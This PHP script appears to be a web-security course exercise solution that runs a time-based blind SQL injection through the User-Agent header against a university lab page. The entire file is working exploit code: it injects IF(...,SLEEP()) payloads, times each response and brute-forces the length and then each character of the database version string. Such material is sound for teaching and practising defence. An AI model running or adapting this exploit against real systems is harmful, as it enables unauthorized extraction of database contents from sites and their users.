<?php

// sends HTTP request using CURL and returns the time taken (DO NOT MODIFY - this function has been fully implemented)
function call_curl($arg) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, "https://webappsec.cs.ut.ee/sqli/blind.php");
    curl_setopt($ch, CURLOPT_USERAGENT, $arg);

    $time_start = microtime(true);
    $out = curl_exec($ch);
    $total_time = microtime(true) - $time_start;
    curl_close($ch);
    return $total_time;
}


$delay = 2; // how long to sleep
$target = "version()";

// brute-forcing length(version())
$length = 0;
while (true) {
    echo "[+] Checking length: $length\n";
    $time = call_curl("', IF(LENGTH($target)=$length,NOW()+SLEEP($delay),NOW())) -- rem");
    if ($time>$delay) {
      echo "[+] Length found: $length\n";
      break;
    }
    

    $length++;
}

// brute-forcing each character of version()
$result="";
for ($i=1; $i<=$length; $i++) {

    foreach (str_split('0123456789.-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') as $char) {
        $chartime = call_curl("',IF(SUBSTRING($target,$i,1)='$char' ,NOW()+SLEEP($delay),NOW()) )-- rem");
        if ($chartime>$delay) {
          $result = $result.$char;
          echo "[+] $target: $result\n";
        }
    }

}

?>
